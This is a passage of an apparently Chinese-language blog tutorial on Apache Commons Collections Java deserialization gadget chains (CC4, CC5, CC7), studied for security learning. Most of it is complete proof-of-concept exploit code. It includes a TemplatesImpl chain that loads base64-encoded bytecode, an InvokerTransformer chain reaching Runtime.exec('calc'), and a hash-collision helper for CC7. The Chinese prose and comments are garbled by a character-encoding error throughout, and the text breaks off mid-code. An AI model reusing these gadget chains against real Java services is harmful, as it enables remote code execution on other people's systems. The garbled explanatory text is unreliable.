class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMc2VyL2V2YWxDbGFzc1RlbXBsYXRlc0ltcGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAbZXZhbENsYXNzVGVtcGxhdGVzSW1wbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEAGnNlci9ldmFsQ2xhc3NUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAJAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAVAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAaAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAwACQAPAAwADQANAA4AEQAQAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACM=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; ),<br>        &#125;;<br>        <span class="hljs-comment">//åŒ…è£…innerMapï¼Œå›è°ƒTransformedMap.decorate</span><br>        <span class="hljs-comment">//é˜²æ­¢payloadç”Ÿæˆè¿‡ç¨‹ä¸­è§¦å‘ï¼Œå…ˆæ”¾è¿›å»ä¸€ä¸ªç©ºçš„Transform</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><br>        <span class="hljs-type">Comparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(transformerChain);<br>        <span class="hljs-comment">//ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆå§‹åŒ–æ—¶çš„å¤§å°ï¼Œè‡³å°‘éœ€è¦2ä¸ªå…ƒç´ æ‰ä¼šè§¦å‘æ’åºå’Œæ¯”è¾ƒ</span><br>        <span class="hljs-comment">//ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ¯”è¾ƒæ—¶çš„Comparatorï¼Œä¼ å…¥å‰é¢å®ä¾‹åŒ–çš„comparator</span><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>, comparator);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">2</span>);<br>        setFieldValue(transformerChain, <span class="hljs-string">&quot;iTransformers&quot;</span>, transformers);<br>        <span class="hljs-comment">//ç”Ÿæˆåºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br><br>        <span class="hljs-comment">//System.out.println(barr);</span><br>        <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in);<br>        ois.readObject();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728230441860.png" alt="image-20240728230441860"></p><p>ä¸è¿‡è¿™æ¡åˆ©ç”¨é“¾åœ¨<code>commons-collections3</code>æ˜¯æ— æ³•ä¸­åˆ©ç”¨çš„ã€‚</p><p>å› ä¸º<code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä¹‹å‰æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£ï¼Œæ— æ³•åºåˆ—åŒ–ã€‚</p><h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><p>è¿™ä¸ªé“¾ä¸»è¦æ˜¯ä¸ºäº†è§£å†³é«˜ç‰ˆæœ¬åˆ©ç”¨é—®é¢˜ï¼Œä½¿ç”¨<code>BadAttributeValueExpException</code>æ›¿æ¢<code>AnnotationInvocationHandler</code>é…åˆ<code>TiedMapEntry#toString()</code>å»ä¸²è”<code>LazyMap#get()</code>è°ƒç”¨<code>transform()</code>è§¦å‘<code>ChainedTransformer</code>æ¶æ„å¯¹è±¡åå°„é“¾ã€‚</p><p>ä¹Ÿå°±æ˜¯æˆ‘ä»¬å‰é¢CC1è°ˆåˆ°çš„ï¼š</p><p>åœ¨8u71ä»¥åJavaå®˜æ–¹ä¿®æ”¹äº†<code>sun.reflect.annotation.AnnotationInvocationHandler</code>çš„<code>readObject</code>å‡½æ•°ï¼š<a href="http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d">http://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p>æ”¹åŠ¨åï¼Œä¸å†ç›´æ¥ä½¿ç”¨ååºåˆ—åŒ–å¾—åˆ°çš„Mapå¯¹è±¡ï¼Œè€Œæ˜¯æ–°å»ºäº†ä¸€ä¸ª<code>LinkedHashMap</code>å¯¹è±¡ï¼Œå¹¶å°†åŸæ¥çš„é”®å€¼æ·»åŠ è¿›å»ï¼Œä¼ è¿›å»çš„æ¶æ„Mapä¸å†æ‰§è¡Œsetæˆ–putæ“ä½œï¼Œä¾¿æ— æ³•è§¦å‘<code>transform</code>ã€‚</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject()<br>    BadAttributeValueExpException#readObject()<br>    TiedMapEntry#toString()<br>    LazyMap#get()<br>                       <span class="hljs-comment">//æ¶æ„å¯¹è±¡åå°„é“¾éƒ¨åˆ†</span><br>    ChainedTransformer.transform()<br>                            ConstantTransformer#transform()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Class#getMethod()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#getRuntime()<br>                            InvokerTransformer#transform()<br>                            Method#invoke()<br>                            Runtime#exec()<br></code></pre></td></tr></table></figure><p>å€Ÿç”¨å­¦é•¿çš„æ”¹æ”¹ï¼ŒåŒæ—¶æŠŠserializeå’Œdeserializeå†™è¿›å‡½æ•°é‡Œï¼Œç®—æ˜¯æ¢ä¸€ç§ä»£ç é£æ ¼ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.*;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        ChainedTransformer chain=getChainedTransformer();<br>        Map lazymap=LazyMap.decorate(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>(),chain);<br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-number">1</span>);<br>        BadAttributeValueExpException e=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(e,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br>        deserialize(serialize(e));<br>    &#125;<br>    <span class="hljs-keyword">static</span> ChainedTransformer <span class="hljs-title function_">getChainedTransformer</span><span class="hljs-params">()</span>&#123;<br>        ConstantTransformer ct=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class);<br><br>        InvokerTransformer it1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;getMethod&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;invoke&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;<br>        );<br>        InvokerTransformer it_exec=<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                <span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;<br>        );<br>        Transformer[] a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;ct,it1,it2,it_exec&#125;;<br>        ChainedTransformer chain=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(a);<br>        <span class="hljs-keyword">return</span> chain;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] serialize(Object obj) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(obj);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> baos.toByteArray();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deserialize</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes)).readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728231404160.png" alt="image-20240728231404160"></p><h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>CC7å‹è½´ã€‚</p><p>å› ä¸ºå®ƒçœŸçš„å¾ˆç»•ã€‚æ‰“çš„è¿˜æ˜¯<code>CommonsCollections 3.1 - 3.2.1</code></p><p>æ¢äº†<code>Hashtable</code>ç±»ï¼Œåˆ©ç”¨å…¶<code>reconstitutionPut</code>æ–¹æ³•ä¸­æ¯”è¾ƒkeyçš„å€¼ï¼Œä¼šè°ƒç”¨LazyMapçš„equalsæ–¹æ³•ã€‚</p><h3 id="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"><a href="#ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap" class="headerlink" title="ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap"></a>ä¸ºä»€ä¹ˆè¦putä¸¤ä¸ªlazymap</h3><p>å› ä¸ºä¸ºäº†è¿›<code>reconstitutionPut</code> <code>for</code>å¾ªç¯ï¼Œ<code>tab</code>éœ€è¦ä¸ä¸ºç©ºã€‚</p><p><code>tab</code>å…¶å®å°±æ˜¯<code>hashtable</code>ï¼Œ<code>entry</code>æ˜¯å•é“¾ï¼ŒåŠ¨è°ƒèƒ½å‘ç°<code>put</code>ä¸¤ä¸ªçš„æ—¶å€™èƒ½è®©<code>tab</code>ä¸ä¸ºç©º</p><img src="/2024/07/28/Commons-Collections/image-20240728232740736.png" class="" title="image-20240728232740736"><h3 id="å“ˆå¸Œç¢°æ’"><a href="#å“ˆå¸Œç¢°æ’" class="headerlink" title="å“ˆå¸Œç¢°æ’"></a>å“ˆå¸Œç¢°æ’</h3><p><code>if</code>è¿™ä¸€è¡Œç”±äºç”¨ <code>&amp;&amp;</code> è¿æ¥ï¼Œå·¦è¾¹ä¸º<code>false</code>å°±ä¸ä¼šæ‰§è¡Œå³è¾¹ã€‚</p><p>è¿™ä¸¤ä¸ª<code>hash</code>å¯¹åº”å½“å‰<code>key</code>å’Œä¸Šä¸€ä¸ª<code>key</code>çš„<code>hashcode</code>ï¼š</p><img src="/2024/07/28/Commons-Collections/image-20240728233018118.png" class="" title="image-20240728233018118"><p>è¿™é‡Œkeyæˆ‘ä»¬é€‰æ‹©çš„æ˜¯Stringï¼Œè§‚å¯Ÿ<code>String.hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> hash;<br>    <span class="hljs-keyword">if</span> (h == <span class="hljs-number">0</span> &amp;&amp; value.length &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">char</span> val[] = value;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; value.length; i++) &#123;<br>            h = <span class="hljs-number">31</span> * h + val[i];<br>        &#125;<br>        hash = h;<br>    &#125;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br></code></pre></td></tr></table></figure><p>çˆ†ç ´ä¸¤ä½å°±å¯:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HashCollision</span> &#123;<br>    <span class="hljs-keyword">static</span> String dict=<span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> len=dict.length();<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a1=<span class="hljs-number">0</span>;a1&lt;len;a1++)&#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> a2=<span class="hljs-number">0</span>;a2&lt;len;a2++)&#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b1=<span class="hljs-number">0</span>;b1&lt;len;b1++)&#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b2=<span class="hljs-number">0</span>;b2&lt;len;b2++)&#123;<br>                        <span class="hljs-keyword">if</span>(a1!=b1&amp;&amp;a2!=b2)&#123;<br>                            String s1=get(a1)+get(a2);<br>                            String s2=get(b1)+get(b2);<br>                            <span class="hljs-keyword">if</span>(s1.hashCode()==s2.hashCode())&#123;<br>                                System.out.println(s1+<span class="hljs-string">&quot;\n&quot;</span>+s2);<br>                                <span class="hljs-keyword">return</span>;<br>                            &#125;<br>                        &#125;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;fuck&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">static</span> String <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>        <span class="hljs-keyword">return</span>  String.valueOf(dict.charAt(i));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸ºä»€ä¹ˆmap2-remove-00"><a href="#ä¸ºä»€ä¹ˆmap2-remove-00" class="headerlink" title="ä¸ºä»€ä¹ˆmap2.remove(&quot;00&quot;);"></a>ä¸ºä»€ä¹ˆ<code>map2.remove(&quot;00&quot;);</code></h3><p>å…¶å®å’Œä¸Šé¢çš„CommonsCollections6ä¸€æ ·é“ç†ï¼Œ<code>hashtable.put(map2, 1);</code>è¿™ä¸€è¡Œä¹Ÿä¼šè°ƒç”¨<code>lazymap.get</code>ï¼Œä»è€Œå¤šåŠ äº†ä¸€ä¸ªå¸¦ç€<code>processImpl</code>çš„å…ƒç´ ï¼Œä¸èƒ½åºåˆ—åŒ–ã€‚</p><p><img src="/2024/07/28/Commons-Collections/image-20240728233236250.png" alt="image-20240728233236250"></p><h3 id="POC-6"><a href="#POC-6" class="headerlink" title="POC"></a>POC</h3><p>å…ˆç»™å‡ºGadget Chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">Hashtable#readObject()<br>    Hashtable#reconstitutionPut()<br>AbstractMapDecorator#equals()<br>    AbstractMap#equals()<br>    LazyMap#get()<br>                                <span 